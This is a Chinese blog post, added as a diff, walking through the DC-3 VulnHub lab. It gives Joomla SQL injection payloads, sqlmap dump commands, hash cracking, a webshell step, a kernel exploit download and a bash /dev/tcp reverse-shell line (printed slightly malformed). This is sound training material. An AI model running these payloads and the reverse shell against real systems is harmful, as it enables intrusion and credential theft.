@@ -1,0 +1,617 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="梧桐虽立，其心以空，待发于春，实葬于冬" type="application/atom+xml"><link rel="alternate" type="application/json" title="梧桐虽立，其心以空，待发于春，实葬于冬" href="https://zlaryy.top/feed.json"/><link rel="preconnect" href="https://s4.zstatic.net"/><link rel="preconnect" href="https://at.alicdn.com"/><link rel="modulepreload" href="/js/siteInit.js"></link><link rel="modulepreload" href="/js/nyx-player-HIXTN7KD.js"></link><link rel="modulepreload" href="/js/copy-tex-4AIDXWNJ.js"></link><link rel="modulepreload" href="/js/post-MYXPIC3N.js"></link><link rel="modulepreload" href="/js/chunk-T54OBHW4.js"></link><link rel="modulepreload" href="/js/index.esm-22UB7CNZ.js"></link><link rel="modulepreload" href="/js/chunk-HJSTZ4VX.js"></link><link rel="modulepreload" href="/js/chunk-ALXQBZTY.js"></link><link rel="stylesheet" href="/css/siteInit.css" media="none" onload="this.media&#x3D;&#39;all&#39;"></link><link rel="preload" href="/assets/picture1.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture5.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture4.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture3.webp" as="image" fetchpriority="high"><link rel="preload" href="/assets/picture2.webp" as="image" fetchpriority="high"><meta name="keywords" content="Web安全"/><meta name="description" content="Web安全 / CTF / AI安全 / 个人学习笔记"/><link rel="canonical" href="https://zlaryy.top/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"><link rel="stylesheet" href="/css/post.css?v=0.5.4"><link rel="stylesheet" href="/css/mermaid.css?v=0.5.4"><!-- 临时处理--><link rel="stylesheet" media="none" onload="this.media='all'" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css"><title>DC-3靶场日记</title><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css">
+<link rel="stylesheet" href="/css/custom.css"><style>.zlaryy-view-item{white-space:nowrap}.zlaryy-pageview-count{margin-inline-start:4px}.segments article.item>.info>.meta{display:flex;flex-wrap:wrap;column-gap:.65rem;row-gap:.2rem}.segments article.item>.info>.meta>.item{margin:0}</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="pagefind_mount"></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">DC-3靶场日记</h1><div class="meta"><span class="item" title="创建时间：2026-11-06 17:50:00"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2026-11-06T17:50:00+08:00">2026-11-06</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>5.9k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>5 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ZLARYY</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><ul><li class="item" style="background-image: url(&quot;/assets/picture1.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture5.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture4.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture3.webp&quot;);"></li><li class="item" style="background-image: url(&quot;/assets/picture2.webp&quot;);"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" data-pagefind-body="data-pagefind-body" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zlaryy.top/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avertar.png"/><meta itemprop="name" content="ZLARYY"/><meta itemprop="description" content=", Web安全 / CTF / AI安全 / 个人学习笔记"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="梧桐虽立，其心以空，待发于春，实葬于冬"/></span><div class="body md" itemprop="articleBody"><h1 id="dc-3靶场日记"><a class="anchor" href="#dc-3靶场日记">#</a> DC-3靶场日记</h1>
+<p>靶场地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/14038071.html">DC靶机1-9合集 - Lmg66 - 博客园</a></p>
+<h1 id="寻找靶机ip并探测端口"><a class="anchor" href="#寻找靶机ip并探测端口">#</a> 寻找靶机IP并探测端口</h1>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>sudo arp-scan -l</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/1.png" class=""></p>
+<p>对比MAC地址可以找到IP为<code>192.168.152.131</code></p>
+<p>探测靶机开放端口：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>nmap -sV -p- 192.168.152.131</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/2.png" class=""></p>
+<p>发现开放了80端口</p>
+<h1 id="信息搜集"><a class="anchor" href="#信息搜集">#</a> 信息搜集</h1>
+<p>访问<code>192.168.152.131</code>查看一下网页信息</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/3.png" class=""></p>
+<p>通过Wappalyzer发现CMS系统是Joomla，并且还看到了一串提示：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>This time, there is only one flag, one entry point and no clues.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>To get the flag, you'll obviously have to gain root privileges.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>How you get to be root is up to you - and, obviously, the system.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Good luck - and I hope you enjoy this little challenge.  :-)</span></span></code></pre>
+<p>在Kali里面安装一个joomscan，这是一个Joomla扫描仪，它帮助网络开发人员和网站管理员帮助确定已部署的Joomla网站可能存在的安全漏洞，也可以使用CMSseek进一步扫描</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 安装joomscan并探测</span></span>
+<span class="line"><span>apt-get install joomscan</span></span>
+<span class="line"><span>joomscan --url http://192.168.152.131</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 安装CMSseek并扫描</span></span>
+<span class="line"><span>git clone https://github.com/Tuhinshubhra/CMSeek</span></span>
+<span class="line"><span>cd /home/kali/CMSeek</span></span>
+<span class="line"><span>python3 cmseek.py --url 192.168.152.131</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/4.png" class=""></p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/5.png" class=""></p>
+<p>两个工具一样的，都可以扫描发现Joomla版本和其他目录</p>
+<h1 id="搜索joomla漏洞"><a class="anchor" href="#搜索joomla漏洞">#</a> 搜索joomla漏洞</h1>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>searchsploit joomla 3.7.0</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/6.png" class=""></p>
+<p>查看漏洞详情：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt </span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/7.png" class=""></p>
+<p>发现是SQL Injection，原理为<code>com_fields</code>组件对请求数据没有进行过滤，从而导致SQL注入</p>
+<p>还记得工具metasploit查找漏洞吗（提一下）：</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/8.png" class=""></p>
+<p>我们还发现文件中列了一个URL Vulerable：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://localhost/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml%27</span></span></code></pre>
+<p>大概是poc，修改一下尝试攻击：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(1,concat(0x7e,database()),1)</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/9.png" class=""></p>
+<p>可以看到在最后的XPATH报错里面成功输出了数据库名<code>joomladb</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 获取所有数据库名</span></span>
+<span class="line"><span>updatexml(1,concat(0x7e,substring((select group_concat(schema_name) from information_schema.schemata),40,31)),1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>information_schema,joomladb,mysql,performance_schema,sys</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/11.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 获取当前数据库表名</span></span>
+<span class="line"><span>updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>#__assets,#__associations,#__banner_clients......</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/10.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 获取当前数据库所有列名</span></span>
+<span class="line"><span>updatexml(1,concat(0x7e,substring((select group_concat(column_name) from information_schema.columns where table_schema=database()),1,31)),1)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>id,parent_id,lft,rgt,level,name,title,rules,id,context,key,id,name,conjtact,email,extrainfo</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/12.png" class=""></p>
+<p>像这样限制字符长度输出表名列名未免太麻烦了</p>
+<h1 id="sqlmap注入"><a class="anchor" href="#sqlmap注入">#</a> sqlmap注入</h1>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 爆库名</span></span>
+<span class="line"><span>sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list%5Bfullordering%5D=id' -p 'list[fullordering]' --batch --dbs</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-p:只检测指定参数</span></span>
+<span class="line"><span>--batch:自动采用默认选项，减少交互</span></span>
+<span class="line"><span>--dbs：在确认存在注入之后枚举数据库名称</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/13.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查表名</span></span>
+<span class="line"><span>sqlmap -u "http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" --tables</span></span>
+<span class="line"><span>或者</span></span>
+<span class="line"><span>sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list%5Bfullordering%5D=id' -p 'list[fullordering]' --batch -D "joomladb" --tables</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-D:指定数据库为joomladb</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/14.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 爆字段名</span></span>
+<span class="line"><span>sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list%5Bfullordering%5D=id' -p 'list[fullordering]' -D "joomladb" -T "#__users" --columns</span></span>
+<span class="line"><span>或者</span></span>
+<span class="line"><span>sqlmap -u "http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" --columns</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/15.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 爆数据</span></span>
+<span class="line"><span>sqlmap -u 'http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list%5Bfullordering%5D=id' -p 'list[fullordering]' -D "joomladb" -T "#__users" -C name,password --dump</span></span>
+<span class="line"><span>或者</span></span>
+<span class="line"><span>sqlmap -u "http://192.168.152.131/index.php?option=com_fields&#x26;view=fields&#x26;layout=modal&#x26;list[fullordering]=updatexml(1,concat(0x7e,database()),1)" -D "joomladb" -T "#__users" -C name,password --dump</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/16.png" class=""></p>
+<h1 id="破解密码"><a class="anchor" href="#破解密码">#</a> 破解密码</h1>
+<p><strong>Join the Ripper(&quot;JtR&quot;)</strong>：开源密码破解工具，通常是对获取到的密码哈希值进行离线破解，John会尝试不同的候选密码，计算它们的哈希值并进行比较，如果匹配就找到了对应的明文密码，常见的破解方式包括：字典攻击、暴力破解、规则攻击、增量模式</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 创建哈希文件hash.txt</span></span>
+<span class="line"><span>echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt</span></span>
+<span class="line"><span># 爆破密码</span></span>
+<span class="line"><span>john hash.txt</span></span>
+<span class="line"><span>john hash.txt --show</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/17.png" class=""></p>
+<p>注意这里在<code>echo</code>的时候只能用单引号而不是双引号，原因是不会让字符串里的<code>$</code>转义，例如<code>echo &quot;$SHELL&quot;</code>的结果并不是<code>$SHELL</code>，而是<code>SHELL</code>变量的值</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/18.png" class=""></p>
+<h1 id="登录administrator"><a class="anchor" href="#登录administrator">#</a> 登录administrator</h1>
+<p>成功登录之后我们进入<code>Extentions -&gt; Templates -&gt; Templates</code></p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/19.png" class=""></p>
+<p>看到两个Template，进入第一个</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/20.png" class=""></p>
+<p>在这里我们可以<code>New File</code>编写文件，书写一句话木马</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/21.png" class=""></p>
+<p>编辑好之后点击Save，然后蚁剑连接：</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/22.png" class=""></p>
+<p>接下来我们就可以在蚁剑的虚拟终端中执行接下来的操作了</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/23.png" class=""></p>
+<p>尝试寻找SUID文件进行提权：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>find / -user root -perm -4000 -print 2>/dev/null</span></span>
+<span class="line"><span>find / -perm -u=s -type f 2>/dev/null</span></span>
+<span class="line"><span>find / -user root -perm -4000 -exec ls &#123;&#125; \; 2>/dev/null</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/24.png" class=""></p>
+<p>发现没有可提权程序，尝试<code>sudo -l</code>寻找SUDO提权也不行</p>
+<h1 id="linux内核提权"><a class="anchor" href="#linux内核提权">#</a> Linux内核提权</h1>
+<p>之前倒是也写过Linux提权相关的文章，到这里的知识就补充到那篇文章里面，参考文章来自Yuy0ung师傅：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/18326546">Linux提权-内核提权 - Yuy0ung - 博客园</a></p>
+<h2 id="信息搜集-2"><a class="anchor" href="#信息搜集-2">#</a> 信息搜集</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 查看系统全部信息</span></span>
+<span class="line"><span>uname -a</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查看Linux系统的版本信息</span></span>
+<span class="line"><span>cat /etc/issue</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/25.png" class=""></p>
+<h2 id="查找exp"><a class="anchor" href="#查找exp">#</a> 查找EXP</h2>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 寻找内核提权脚本</span></span>
+<span class="line"><span>searchsploit Ubuntu 16.04</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/26.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 将EXP移动到当前目录</span></span>
+<span class="line"><span>searchsploit -m linux/local/39772.txt</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查看EXP</span></span>
+<span class="line"><span>cat /home/kali/39772.txt</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/27.png" class=""></p>
+<p>得到EXP的地址：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span></span></code></pre>
+<p>在蚁剑中我们下载然后解压并上传<code>exploit.tar</code>到靶机目录</p>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/28.png" class=""></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>tar -xf exploit.tar</span></span>
+<span class="line"><span>cd ebpf_mapfd_doubleput_exploit</span></span>
+<span class="line"><span>./compile.sh</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/29.png" class=""></p>
+<p>这里看到没有显示编译错误，而是两条警告，接下来我们需要准备反弹shell，在kali上执行<code>./doubleput</code>：</p>
+<p>kali端执行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>nc -l -p 4444</span></span></code></pre>
+<p>蚁剑上执行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>bash -c 'bash -i /dev/tcp/192.168.152.128/4444 0>&#x26;1'</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/31.png" class=""></p>
+<p>跳转目录到<code>ebpf_mapfd_doubleput_exploit</code>之后执行<code>./doubleput</code>，等待一会发现成功提权</p>
+<p>最后找到flag在root目录下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>cat /root/the-flag.txt</span></span></code></pre>
+<p><img loading="lazy" src="/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/32.png" class=""></p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-11-06 17:53:32" itemprop="dateModified" datetime="2026-11-06T17:53:32+08:00">2026-11-06</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>梧桐虽立，其心以空，待发于春，实葬于冬</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/11/06/DC-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" title="DC-3靶场日记">https://zlaryy.top/2026/11/06/DC-3靶场日记/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture2.webp" title="DC-2靶场日记"><span class="type">上一篇</span><h3>DC-2靶场日记</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dc-3%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text"> DC-3靶场日记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E9%9D%B6%E6%9C%BAip%E5%B9%B6%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.</span> <span class="toc-text"> 寻找靶机IP并探测端口</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text"> 信息搜集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2joomla%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text"> 搜索joomla漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text"> sqlmap注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">6.</span> <span class="toc-text"> 破解密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%99%BB%E5%BD%95administrator"><span class="toc-number">7.</span> <span class="toc-text"> 登录administrator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text"> Linux内核提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-number">8.1.</span> <span class="toc-text"> 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEexp"><span class="toc-number">8.2.</span> <span class="toc-text"> 查找EXP</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / AI安全 / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">27</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" 